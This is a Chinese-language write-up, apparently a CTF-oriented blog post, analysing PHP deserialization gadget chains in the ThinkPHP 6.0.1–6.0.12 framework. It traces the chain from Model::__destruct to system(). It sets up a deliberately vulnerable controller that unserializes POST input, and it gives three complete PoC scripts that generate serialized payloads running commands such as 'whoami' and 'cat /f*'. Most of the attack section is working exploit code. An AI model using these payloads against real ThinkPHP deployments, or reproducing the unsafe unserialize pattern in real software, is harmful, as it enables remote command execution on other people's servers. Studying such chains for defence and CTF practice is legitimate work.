# 配置

[序言 · ThinkPHP6.0完全开发手册 · 看云
(kancloud.cn)](https://www.kancloud.cn/manual/thinkphp6_0/1037479)

6.0.1

    
    
    composer create-project topthink/think tp6.0.1
    
        "require": {
            "php": ">=7.1.0",
            "topthink/framework": "6.0.1",
            "topthink/think-orm": "^2.0"
        },
    
    composer update

6.0.12

    
    
    composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
    composer create-project topthink/think tp6.0.12

控制器仿照国赛样式写到了index控制器里写了个test方法

    
    
    <?php
    namespace app\controller;
    
    use app\BaseController;
    
    class Index extends BaseController
    {
        public function test(){
            unserialize($_POST['a']);
        }
    }
    

# 分析

## 6.0.1—6.0.3

写好后发现不是很好理解，应该用回溯法写的，先这样吧。。。。。。。

先从旧版本开始，等会再看国赛6.0.12的

反序列化先找入口

`/vendor/topthink/think-orm/src/Model.php`

    
    
    public function __destruct()
    {
        if ($this->lazySave) {
            $this->save();
        }
    }
    

lazySave可控，直接跟进save()

    
    
    public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);
    
        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
    
        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
    
        if (false === $result) {
            return false;
        }
    
        // 写入回调
        $this->trigger('AfterWrite');
    
        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->get      = [];
        $this->lazySave = false;
    
        return true;
    }
    

直接调用了`save()`方法没有传任何值，所以`$this->setAttrs($data);`中什么都没执行，接着进入if语句

    
    
    public function isEmpty(): bool
    {
        return empty($this->data);
    }
    
    protected function trigger(string $event): bool
    {
        if (!$this->withEvent) {
            return true;
    }
    

想绕过if,让`$this->data`有值，`$this->withEvent`为false即可

接着进入`updateData()`

    
    
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }
    
        $this->checkData();
    
        // 获取有更新的数据
        $data = $this->getChangedData();
    
        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
    
            return true;
        }
    
        if ($this->autoWriteTimestamp && $this->updateTime) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp();
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }
    
        // 检查允许字段
        $allowFields = $this->checkAllowFields();
        ...............................
    }
    

第一个if还是进行了`trigger()`判断，跟前边那个一样，可以直接绕过,`checkData()`也没执行任何东西，接着跟进`$data =
$this->getChangedData();`

    
    
    public function getChangedData(): array
    {
        $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) {
            if ((empty($a) || empty($b)) && $a !== $b) {
                return 1;
            }
    
            return is_object($a) || $a != $b ? 1 : 0;
        });
    
        // 只读字段不允许更新
        foreach ($this->readonly as $key => $field) {
            if (array_key_exists($field, $data)) {
                unset($data[$field]);
            }
        }
    
        return $data;
    }
    

控制`$this->force`的值即可将我们传入的`$this->data`的值给$data

接着进入下边的`checkAllowFields()`,进入`db()->instance()`，最后

    
    
    return $this->instance[$name];
    

由于$this是类`DbManager`的实例化，所以会执行__toString()，下面的几部操作就跟tp5.1的很像了

    
    
    __toString()->
    toJson()->
    toArray()->
    getAttr()

先看下进入`toArray()`的部分代码

![](./img/8039368150870712498.png)  
`$data = array_merge($this->data,
$this->relation);`,这里`$this->data`是可控的即：我们传入的值，之后会进行if判断，只要我们在初始化时不给`$this->hidden`和`$hasVisible`值，默认就可进入这条if语句

跟进`getAttr()`

    
    
    public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = $this->isRelationAttr($name);
            $value    = null;
        }
    
        return $this->getValue($name, $value, $relation);
    }
    

最后会执行`getValue`，用到参数`$name, $value, $relation`,所以跟进一下`getData()`看下$value的值

    
    
    public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }
    
        $fieldName = $this->getRealFieldName($name);
    
        if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
        } elseif (array_key_exists($fieldName, $this->relation)) {
            return $this->relation[$fieldName];
        }
    
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
    

再跟进`getRealFieldName()`

    
    
    protected function getRealFieldName(string $name): string
    {
        if ($this->convertNameToCamel || !$this->strict) {
            return Str::snake($name);
        }
    
        return $name;
    }
    

`$this->convertNameToCamel`这里为空，`$this->strict`默认也是true，所以直接`return
$name`。所以`$fieldName=$name`,当$this->data中存在键`$fieldName`即会retrun返回(这里回溯到toArray()方法中，其实$fieldName就是我们data的键值)

    
    
    if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
        } elseif (array_key_exists($fieldName, $this->relation)) {
            return $this->relation[$fieldName];
        }
    

所以最后的`getAttr#value`=我们传入的$data的值

看完$value,回到`getAttr()`,进入`getValue()`，else语句中会执行如下语句

    
    
    } else {
        $closure = $this->withAttr[$fieldName];
            $value = $closure($value, $this->data);
    }

`$closure = $this->withAttr[$fieldName];`,如果构造

    
    
    private $data = ["key"=>"whoami"];
    private $withAttr = ["key"=>"system"];
    

那么`$fieldName=$data的key=key`,`withAttr[$fieldName]=withAttr['key']=system`,之后执行
$closure($value, $this->data);，就相当于`system('whoami');`，最后retrun返回即成功命令执行

POC

    
    
    <?php
    namespace think\model\concern;
    trait Attribute
    {
        private $data = ["key"=>"whoami"];
        private $withAttr = ["key"=>"system"];
    }
    namespace think;
    abstract class Model
    {
        use model\concern\Attribute;
        private $lazySave = true;
        protected $withEvent = false;
        private $exists = true;
        private $force = true;
        protected $name;
        public function __construct($obj=""){
            $this->name=$obj;
        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {}
    $a=new Pivot();
    $b=new Pivot($a);
    echo urlencode(serialize($b));
    

## 6.0.12

具体影响版本我也没测试，应该就是6.0.4—6.0.12吧，

前边都是一样的只是后边的else语句发生了变化：

之前

    
    
    if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
        $value = $this->getJsonValue($fieldName, $value);
    } else {
        $closure = $this->withAttr[$fieldName];
            $value = $closure($value, $this->data);
    }
    

现在：

    
    
    if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
        $value = $this->getJsonValue($fieldName, $value);
    } else {
        $closure = $this->withAttr[$fieldName];
        if ($closure instanceof \Closure) {
            $value = $closure($value, $this->data);
        }
    

在执行`$value = $closure($value,
$this->data);`之前多了一条if判断，它会再一次判断$closure是否为闭包函数，所以在这里原来链就被断了，但师傅们想到了另一种方法，就是进入if中的`getJsonValue()`，跟进看一下

    
    
    protected function getJsonValue($name, $value)
        {
            if (is_null($value)) {
                return $value;
            }
    
            foreach ($this->withAttr[$name] as $key => $closure) {
                if ($this->jsonAssoc) {
                    $value[$key] = $closure($value[$key], $value);
                } else {
                    $value->$key = $closure($value->$key, $value);
                }
            }
    
            return $value;
        }
    

只要构造`$this->jsonAssoc = true;`，就能进入if执行`$value[$key] = $closure($value[$key],
$value);`从而达到同样的效果

下面看一下具体绕过方式：

首先就是绕过if判断`if (in_array($fieldName, $this->json) &&
is_array($this->withAttr[$fieldName])) {`

先看`in_array($fieldName, $this->json)`，之前也说过其实$fieldName就是我们data的键值，所以可以构造：

    
    
    protected $json = ["key"];

当data的键为key时，`$fieldName`就为key，那就满足了in_array

再看`is_array($this->withAttr[$fieldName])`

相当于判断withAttr['key']是否为数组，所以就可以构造：

    
    
    private $withAttr = ["key"=>["key1"=>"system"]];

绕过后便进入了`getJsonValue()`——>$value = $this->getJsonValue($fieldName, $value);
其中$fieldName, $value分别是data的键和值，上条链有说过。先看下最后设置的$data值

    
    
    private $data = ["key" => ["key1" => "whoami"]];

跟进后看下foreach语句,$name是上边的$fieldName=key，$value还是之前的$value的值=["key1" =>
"whoami"]

    
    
    protected function getJsonValue($name, $value)
    {
    foreach ($this->withAttr[$name] as $key => $closure) {
        if ($this->jsonAssoc) {
            $value[$key] = $closure($value[$key], $value);
        }
    

所以这里`withAttr[$name]=withAttr['key']=["key1"=>"system"]`,所以经过foreach后$key=key1,$closure=system

将`$this->jsonAssoc`设为true——>`$this->jsonAssoc = true;`

最后进入if，`$closure($value[$key],
$value);`=>system('data['key1]',$value)=>system('whoami',$value);

这里后边跟个$value对system是没有影响的

![](./img/2265295798341479499.png)  
所以最后成功执行并retrun返回了

POC

    
    
    <?php
    
    namespace think\model\concern;
    
    trait Attribute
    {
        private $data = ["key" => ["key1" => "whoami"]];
        private $withAttr = ["key"=>["key1"=>"system"]];
        protected $json = ["key"];
    }
    namespace think;
    
    abstract class Model
    {
        use model\concern\Attribute;
        private $lazySave;
        protected $withEvent;
        private $exists;
        private $force;
        protected $table;
        protected $jsonAssoc;
        function __construct($obj = '')
        {
            $this->lazySave = true;
            $this->withEvent = false;
            $this->exists = true;
            $this->force = true;
            $this->table = $obj;
            $this->jsonAssoc = true;
        }
    }
    
    namespace think\model;
    
    use think\Model;
    
    class Pivot extends Model
    {
    }
    $a = new Pivot();
    $b = new Pivot($a);
    
    echo urlencode(serialize($b));
    

还有个针对6.0.9以后的poc

    
    
    <?php
    
    namespace think\model\concern;
    
    trait Attribute{
        private $data=['jiang'=>['jiang'=>'cat /f*']];
        private $withAttr=['jiang'=>['jiang'=>'system']];
        protected $json=["jiang"];
        protected $jsonAssoc = true;
    }
    trait ModelEvent{
        protected $withEvent;
    }
    
    namespace think;
    
    abstract class Model{
        use model\concern\Attribute;
        use model\concern\ModelEvent;
        private $exists;
        private $force;
        private $lazySave;
        protected $suffix;
    
    
        function __construct($a = '')
        {
            $this->exists = true;
            $this->force = true;
            $this->lazySave = true;
            $this->withEvent = false;
            $this->suffix = $a;
        }
    }
    
    namespace think\model;
    
    use think\Model;
    
    class Pivot extends Model{}
    
    echo urlencode(serialize(new Pivot(new Pivot())));
    

